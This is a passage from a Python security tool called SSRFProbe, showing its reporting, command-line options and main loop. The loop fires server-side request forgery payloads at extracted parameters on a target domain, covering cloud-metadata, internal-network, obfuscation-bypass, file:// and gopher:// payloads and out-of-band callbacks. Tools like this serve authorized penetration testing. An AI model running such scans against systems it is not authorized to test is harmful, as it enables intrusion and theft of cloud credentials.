        f"[white]Injection points:[/] {report.total_injection_points}    "
        f"[white]Payloads sent:[/] {report.total_payloads_sent:,}\n"
        f"[white]OOB domain:[/] {report.oob_domain or 'not configured'}\n\n"
        f"[bold red]CRITICAL:[/] {len(by_sev.get('CRITICAL',[]))}    "
        f"[bold yellow]HIGH:[/] {len(by_sev.get('HIGH',[]))}    "
        f"[yellow]MEDIUM:[/] {len(by_sev.get('MEDIUM',[]))}    "
        f"[cyan]LOW:[/] {len(by_sev.get('LOW',[]))}",
        title="[bold]SSRFProbe Report[/]",
        border_style=border,
    ))

    if not report.findings:
        console.print("[bold green]✓ No SSRF findings detected.[/]")
        if not report.oob_domain:
            console.print(
                "[yellow]  Tip:[/] Run with --oob-domain TOKEN.oast.pro for "
                "blind SSRF detection. Without OOB, only reflective SSRF "
                "is detectable."
            )
        console.print()
        return

    # Summary table
    console.print("\n[bold cyan]── SSRF Findings ──[/]")
    tbl = Table(show_header=True, header_style="bold cyan", border_style="dim")
    tbl.add_column("Severity",  justify="center")
    tbl.add_column("Host",      style="cyan")
    tbl.add_column("Param",     style="yellow")
    tbl.add_column("Category",  style="dim")
    tbl.add_column("Blind",     justify="center")
    tbl.add_column("Title",     max_width=50)

    for f in report.findings:
        col = SEV_COLOR.get(f.severity, "white")
        tbl.add_row(
            f"[{col}]{f.severity}[/]",
            f.host,
            f.param,
            f.payload_category,
            "[red]✓[/]" if f.is_blind else "",
            f.title[:50],
        )
    console.print(tbl)

    # Detail per finding
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        sf = by_sev.get(sev, [])
        if not sf:
            continue
        col = SEV_COLOR.get(sev, "white")
        console.print(f"\n[{col}]── {SEV_EMOJI.get(sev,'')} {sev} ({len(sf)}) ──[/]")
        for i, f in enumerate(sf, 1):
            console.print(
                f"  [{col}][{i}][/] [white]{f.title}[/]\n"
                f"      [dim]Host:[/] {f.host}   "
                f"[dim]Param:[/] {f.param}   "
                f"[dim]Via:[/] {f.payload_category}\n"
                f"      [dim]Payload:[/] {f.payload_url}\n"
                f"      [dim]Evidence:[/] {escape(f.evidence[:180])}"
            )
            if f.curl_command:
                console.print(f"      [dim]Curl:[/]")
                for line in f.curl_command.split("\n")[:3]:
                    console.print(f"        [dim]{escape(line)}[/]")
            if f.cvss_estimate:
                console.print(f"      [dim]CVSS:[/] {f.cvss_estimate}")
            if i < len(sf):
                console.print()

    if not report.oob_domain:
        console.print(
            "\n[dim]Tip: Run with --oob-domain TOKEN.oast.pro to detect "
            "blind SSRF that doesn't reflect content in the response.[/]"
        )
    console.print()


def save_json(report: SSRFReport, path: str) -> None:
    data = {
        "domain":                   report.domain,
        "scan_time":                report.scan_time,
        "source_files":             report.source_files,
        "oob_domain":               report.oob_domain,
        "total_injection_points":   report.total_injection_points,
        "total_payloads_sent":      report.total_payloads_sent,
        "elapsed_seconds":          report.elapsed_seconds,
        "summary": {s: len([f for f in report.findings if f.severity == s])
                    for s in SEVERITY_ORDER},
        "findings": [asdict(f) for f in sorted(
            report.findings,
            key=lambda f: SEVERITY_ORDER.get(f.severity, 9)
        )],
    }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    log.info(f"JSON report saved → {path}")
    log.info(f"  findings[]: {len(report.findings)}")


def save_html(report: SSRFReport, path: str) -> None:
    by_sev = {s: [f for f in report.findings if f.severity == s]
              for s in SEVERITY_ORDER}
    sc = {"CRITICAL":"#f85149","HIGH":"#d29922","MEDIUM":"#e3b341",
          "LOW":"#58a6ff","INFO":"#8b949e"}
    sb = {"CRITICAL":"rgba(248,81,73,.12)","HIGH":"rgba(210,153,34,.12)",
          "MEDIUM":"rgba(227,179,65,.10)","LOW":"rgba(88,166,255,.10)",
          "INFO":"rgba(139,148,158,.08)"}

    rows = ""
    for f in report.findings:
        sev_col = sc.get(f.severity, "#fff")
        rows += (
            f"<tr>"
            + "<td style='color:" + sev_col + ";font-weight:bold'>" + f.severity + "</td>"
            + f"<td style='color:#58a6ff'>{f.host}</td>"
            + f"<td style='color:#d29922'>{f.param}</td>"
            + f"<td style='color:#627384'>{f.payload_category}</td>"
            + f"<td style='text-align:center;color:#f85149'>{'●' if f.is_blind else ''}</td>"
            + f"<td>{f.title}</td>"
            + f"</tr>"
        )

    findings_html = ""
    for sev in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
        sf = by_sev.get(sev, [])
        if not sf:
            continue
        findings_html += (
            f'<div class="sev-section">'
            f'<h3 style="color:{sc[sev]}">{SEV_EMOJI.get(sev,"")} {sev} ({len(sf)})</h3>'
        )
        for i, f in enumerate(sf, 1):
            curl_e = f.curl_command.replace("<","&lt;").replace(">","&gt;")
            ev_e   = f.evidence.replace("<","&lt;").replace(">","&gt;")
            payload_e = f.payload_url.replace("<","&lt;").replace(">","&gt;")
            findings_html += (
                f'<div class="finding" style="border-left:3px solid {sc[sev]};'
                f'background:{sb[sev]}">'
                f'<div class="ft">[{i}] {f.title}</div>'
                f'<div class="fm">'
                f'<span class="badge" style="color:{sc[sev]};background:{sb[sev]};'
                f'border:1px solid {sc[sev]}">{sev}</span>'
                f'<span style="color:#58a6ff;font-size:.8em">{f.host}</span>'
                f'<span style="color:#d29922;font-size:.8em">param: {f.param}</span>'
                f'<span style="color:#627384;font-size:.78em">{f.payload_category}</span>'
                + (f'<span style="color:#f85149;font-size:.75em;font-weight:bold">BLIND OOB</span>'
                   if f.is_blind else "")
                + (f'<span style="color:#d29922;font-size:.75em">{f.cvss_estimate}</span>'
                   if f.cvss_estimate else "")
                + f'</div>'
                f'<div class="fd">{f.detail}</div>'
                f'<div class="ev"><span class="evl">Payload:</span>'
                f'<code>{payload_e}</code></div>'
                + (f'<div class="ev"><span class="evl">Evidence:</span>'
                   f'<code>{ev_e[:300]}</code></div>' if f.evidence else "")
                + (f'<div class="ev"><span class="evl">Reproduce:</span>'
                   f'<pre style="margin:4px 0 0 0;font-size:.8em;color:#a8dadc">'
                   f'{curl_e}</pre></div>' if f.curl_command else "")
                + (f'<div class="ev"><span class="evl">Server response:</span>'
                   f'<code>{f.response_snippet[:200]}</code></div>'
                   if f.response_snippet else "")
                + f'<div class="rec"><span class="recl">Fix:</span> {f.recommendation[:300]}</div>'
                + f'</div>'
            )
        findings_html += "</div>"

    oob_note = ""
    if not report.oob_domain:
        oob_note = (
            '<div style="background:rgba(88,166,255,.08);border:1px solid #1e2d3d;'
            'border-radius:6px;padding:14px;margin-bottom:16px;color:#627384;font-size:.82em">'
            '⚠ OOB domain not configured — only reflective SSRF was tested. '
            'Re-run with --oob-domain TOKEN.oast.pro to detect blind SSRF.'
            '</div>'
        )

    if not findings_html:
        findings_html = "<p style='color:#3fb950'>No SSRF findings detected.</p>"

    html = f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SSRFProbe — {report.domain}</title>
<style>
:root{{--bg:#080c10;--sf:#0d1117;--sf2:#111820;--bd:#1e2d3d;--tx:#cdd6e0;--mt:#627384;}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:var(--bg);color:var(--tx);font-family:'Consolas','Monaco',monospace;
     font-size:13px;line-height:1.7}}
body::before{{content:'';position:fixed;inset:0;
  background-image:linear-gradient(rgba(0,212,255,.012) 1px,transparent 1px),
                   linear-gradient(90deg,rgba(0,212,255,.012) 1px,transparent 1px);
  background-size:40px 40px;pointer-events:none;z-index:0}}
.wrap{{max-width:1400px;margin:0 auto;padding:32px 28px 80px;position:relative;z-index:1}}
h1{{font-family:system-ui,sans-serif;font-size:2em;font-weight:800;color:#fff;
   letter-spacing:-.03em;margin-bottom:6px}}
.sub{{color:var(--mt);font-size:.8em;margin-bottom:32px}}
.stats{{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));
        gap:10px;margin-bottom:28px}}
.stat{{background:var(--sf);border:1px solid var(--bd);border-radius:8px;
       padding:14px;text-align:center}}
.sv{{font-size:1.8em;font-weight:bold}}.sl{{color:var(--mt);font-size:.72em;margin-top:3px}}
.card{{background:var(--sf);border:1px solid var(--bd);border-radius:8px;
       padding:20px;margin-bottom:20px}}
h2{{font-family:system-ui,sans-serif;font-size:1.1em;font-weight:700;color:#fff;
   margin-bottom:14px}}
h3{{font-family:system-ui,sans-serif;font-size:.95em;font-weight:700;margin:16px 0 10px}}
table{{width:100%;border-collapse:collapse}}
th{{background:var(--sf2);color:var(--mt);text-align:left;padding:8px 12px;
   border:1px solid var(--bd);font-size:.72em;text-transform:uppercase;letter-spacing:.07em}}
td{{padding:8px 12px;border-bottom:1px solid var(--bd);vertical-align:top}}
tr:hover td{{background:rgba(88,166,255,.03)}}
.finding{{padding:14px 16px;border-radius:6px;margin-bottom:10px}}
.ft{{font-family:system-ui,sans-serif;font-weight:700;font-size:.9em;color:#fff;
    margin-bottom:8px}}
.fm{{display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap}}
.badge{{padding:2px 8px;border-radius:10px;font-size:.7em;font-weight:700;letter-spacing:.05em}}
.fd{{color:var(--mt);font-size:.83em;margin-bottom:8px;line-height:1.6}}
.ev{{background:rgba(0,0,0,.4);border:1px solid var(--bd);border-radius:4px;
     padding:8px 10px;margin-bottom:8px}}
.evl{{color:#39c5cf;font-size:.7em;font-weight:700;margin-right:6px}}
.ev code,.ev pre{{color:#a8dadc;font-size:.82em;word-break:break-all}}
.rec{{color:#3fb950;font-size:.8em}}.recl{{font-weight:700;margin-right:4px}}
.sev-section{{margin-bottom:20px}}
.footer{{text-align:center;color:var(--mt);font-size:.72em;margin-top:32px;
         padding-top:16px;border-top:1px solid var(--bd)}}
</style></head>
<body><div class="wrap">
<h1>SSRFProbe</h1>
<p class="sub">{report.domain} &nbsp;·&nbsp; {report.scan_time} &nbsp;·&nbsp;
{report.elapsed_seconds:.1f}s &nbsp;·&nbsp;
{report.total_injection_points} injection points &nbsp;·&nbsp;
{report.total_payloads_sent:,} payloads</p>
<div class="stats">
<div class="stat"><div class="sv" style="color:#f85149">{len(by_sev.get('CRITICAL',[]))}</div><div class="sl">CRITICAL</div></div>
<div class="stat"><div class="sv" style="color:#d29922">{len(by_sev.get('HIGH',[]))}</div><div class="sl">HIGH</div></div>
<div class="stat"><div class="sv" style="color:#e3b341">{len(by_sev.get('MEDIUM',[]))}</div><div class="sl">MEDIUM</div></div>
<div class="stat"><div class="sv" style="color:#58a6ff">{len(by_sev.get('LOW',[]))}</div><div class="sl">LOW</div></div>
<div class="stat"><div class="sv">{report.total_injection_points}</div><div class="sl">INJ POINTS</div></div>
<div class="stat"><div class="sv">{report.total_payloads_sent:,}</div><div class="sl">PAYLOADS</div></div>
</div>
<div class="card"><h2>📋 Summary</h2>
{oob_note}
<table><thead><tr>
<th>Severity</th><th>Host</th><th>Param</th>
<th>Category</th><th>Blind</th><th>Title</th>
</tr></thead><tbody>{rows}</tbody></table></div>
<div class="card"><h2>🔎 Findings Detail</h2>{findings_html}</div>
<div class="footer">SSRFProbe &nbsp;·&nbsp; For authorized security research only</div>
</div></body></html>"""

    with open(path, "w", encoding="utf-8") as fh:
        fh.write(html)
    log.info(f"HTML report saved → {path}")


# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="SSRFProbe — Server-Side Request Forgery Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 ssrfprobe.py --js js-findings.json --domain eskimi.com --output ssrf
  python3 ssrfprobe.py --api api-findings.json --domain eskimi.com --output ssrf
  python3 ssrfprobe.py --scan recon-report-v2.json --domain eskimi.com --output ssrf
  python3 ssrfprobe.py --urls targets.txt --domain eskimi.com --output ssrf

  # With OOB (blind SSRF detection):
  python3 ssrfprobe.py --js js-findings.json --domain eskimi.com \\
      --oob-domain abc123.oast.pro --output ssrf
  python3 ssrfprobe.py --js js-findings.json --domain eskimi.com \\
      --webhook https://webhook.site/YOUR-TOKEN --output ssrf

OOB setup:
  interactsh-client is the recommended OOB listener:
    go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
    interactsh-client  # prints your oob domain, use with --oob-domain

Chains from : jsreaper.py (--js), apifuzz.py (--api), reconharvest.py (--scan)
Output      : JSON + HTML with curl PoC per finding
        """,
    )
    src = p.add_mutually_exclusive_group(required=True)
    src.add_argument("--js",   metavar="FILE", help="jsreaper.py output JSON")
    src.add_argument("--api",  metavar="FILE", help="apifuzz.py output JSON")
    src.add_argument("--scan", metavar="FILE", help="reconharvest.py output JSON")
    src.add_argument("--urls", metavar="FILE", help="Plain URL list (one per line)")

    p.add_argument("--domain",       required=True,  help="Target root domain")
    p.add_argument("-o","--output",  metavar="BASE",  help="Output base → BASE.json + BASE.html")
    p.add_argument("--oob-domain",   metavar="DOMAIN",
                   help="OOB callback domain (e.g. abc123.oast.pro from interactsh-client)")
    p.add_argument("--webhook",      metavar="URL",
                   help="Webhook URL for blind OOB detection (e.g. webhook.site URL)")
    p.add_argument("--oob-dns-only", action="store_true",
                   help="Emit DNS-resolution-only OOB probes (monitor DNS callbacks, "
                        "not HTTP) — useful when targets egress DNS but not HTTP")
    p.add_argument("--no-metadata",  action="store_true",
                    help="Skip cloud metadata payloads")
    p.add_argument("--no-internal",  action="store_true",
                    help="Skip internal network probes")
    p.add_argument("--user-agent",  metavar="UA",
                   help="Override the User-Agent header sent on every request (C18)")
    p.add_argument("--no-obfuscation", action="store_true",
                   help="Skip IP obfuscation bypass payloads")
    p.add_argument("--no-schemes",   action="store_true",
                   help="Skip protocol scheme payloads (file://, gopher://, etc.)")
    p.add_argument("--timeout",      type=float, default=12.0,
                   help="HTTP timeout per request (default: 12s)")
    p.add_argument("--concurrency",  type=int,   default=20,
                   help="Concurrent injection point workers (default: 20)")
    p.add_argument("-v","--verbose", action="store_true", help="Verbose logging")
    return p.parse_args()


async def main() -> None:
    args = parse_args()
    if args.verbose:
        log.setLevel(logging.DEBUG)
    if args.user_agent:
        set_user_agent(args.user_agent)

    print("""
╔══════════════════════════════════════════════════════════════════╗
║           SSRFProbe — Server-Side Request Forgery Detection      ║
║  For authorized penetration testing and bug bounty research only ║
╚══════════════════════════════════════════════════════════════════╝
""")

    if not HAS_HTTPX:
        log.error("httpx required: pip install httpx")
        sys.exit(1)

    oob_domain = args.oob_domain or ""
    if oob_domain:
        log.info(f"[Config] OOB domain: {oob_domain}")
    elif args.webhook:
        log.info(f"[Config] Webhook URL: {args.webhook}")
    else:
        log.info(
            "[Config] No OOB configured — only reflective SSRF will be detected. "
            "Use --oob-domain TOKEN.oast.pro for blind SSRF detection."
        )

    # Load injection points
    source_files: list[str] = []
    if args.js:
        points = load_from_jsreaper(args.js, args.domain)
        source_files.append(args.js)
    elif args.api:
        points = load_from_apifuzz(args.api, args.domain)
        source_files.append(args.api)
    elif args.scan:
        points = load_from_recon(args.scan, args.domain)
        source_files.append(args.scan)
    else:
        points = load_from_urlfile(args.urls, args.domain)
        source_files.append(args.urls)

    if not points:
        log.warning(
            "No SSRF injection points found in input. "
            "This usually means no URL/callback parameters were extracted. "
            "Try passing --urls with specific URLs that contain url=, src=, redirect= params."
        )
        # Still create an empty report
        report = SSRFReport(
            domain=args.domain,
            scan_time=datetime.datetime.now(datetime.timezone.utc).isoformat(),
            source_files=source_files,
            oob_domain=oob_domain,
        )
        print_report(report)
        if args.output:
            out_base = args.output
            if out_base.endswith(".json"):
                out_base = out_base[:-5]
            if out_base.endswith(".html"):
                out_base = out_base[:-5]
            save_json(report, out_base + ".json")
            save_html(report, out_base + ".html")
        return

    # Count total payloads
    payload_count = (
        (0 if args.no_metadata   else len(METADATA_PAYLOADS)) +
        (0 if args.no_internal   else len(INTERNAL_PROBES)) +
        (0 if args.no_obfuscation else len(OBFUSCATION_PAYLOADS)) +
        (0 if args.no_schemes    else len(SCHEME_PAYLOADS)) +
        (1 if (args.oob_domain or args.webhook) else 0)
    )
    log.info(
        f"[Config] {len(points)} injection points × {payload_count} payload categories "
        f"= ~{len(points) * payload_count:,} requests"
    )

    report = SSRFReport(
        domain=args.domain,
        scan_time=datetime.datetime.now(datetime.timezone.utc).isoformat(),
        source_files=source_files,
        oob_domain=oob_domain,
        total_injection_points=len(points),
        total_payloads_sent=len(points) * payload_count,
    )

    tester = SSRFTester(
        domain=args.domain,
        oob_domain=oob_domain or None,
        webhook_url=args.webhook,
        timeout=args.timeout,
        test_metadata=not args.no_metadata,
        test_internal=not args.no_internal,
        test_obfuscation=not args.no_obfuscation,
        test_schemes=not args.no_schemes,
        test_oob=bool(args.oob_domain or args.webhook),
        oob_dns_only=args.oob_dns_only,
    )

    t0 = time.perf_counter()
    sem = asyncio.Semaphore(args.concurrency)

    if HAS_RICH:
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]Probing for SSRF[/]"),
            BarColumn(),
            TaskProgressColumn(),
            TextColumn("[dim]{task.fields[p]}[/]"),
            console=console,
        ) as prog:
            task = prog.add_task("ssrf", total=len(points), p="")

            async def bounded(point: InjectionPoint) -> list[SSRFFinding]:
                async with sem:
                    prog.update(task, p=f"{point.param_name}@{point.host}")
                    r = await tester.test_point(point)
                    prog.advance(task)
                    return r

            results = await asyncio.gather(
                *[bounded(pt) for pt in points],
                return_exceptions=True,
            )
    else:
        async def bounded(point: InjectionPoint) -> list[SSRFFinding]:
            async with sem:
                return await tester.test_point(point)

        results = await asyncio.gather(
            *[bounded(pt) for pt in points],
            return_exceptions=True,
        )

    for r in results:
        if isinstance(r, list):
            report.findings.extend(r)
        elif isinstance(r, Exception):
            log.warning(f"Point error: {r}")

    # Deduplicate findings by (host, param, payload_url)
    seen_keys: set[tuple] = set()
    deduped: list[SSRFFinding] = []
    for f in report.findings:
        key = (f.host, f.param, f.payload_url)
        if key not in seen_keys:
            seen_keys.add(key)
            deduped.append(f)
    report.findings = sorted(deduped, key=lambda f: SEVERITY_ORDER.get(f.severity, 9))

    report.elapsed_seconds = round(time.perf_counter() - t0, 2)

    print_report(report)

    if args.output:
        out_base = args.output
        if out_base.endswith(".json"):
            out_base = out_base[:-5]
        save_json(report, out_base + ".json")
        save_html(report, args.output + ".html")

    crit = len([f for f in report.findings if f.severity == "CRITICAL"])
    high = len([f for f in report.findings if f.severity == "HIGH"])
    if crit or high:
        log.warning(
            f"[!] {crit} CRITICAL + {high} HIGH SSRF findings — "
            f"report immediately (SSRF to cloud metadata is P1 on most programs)"
        )


if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
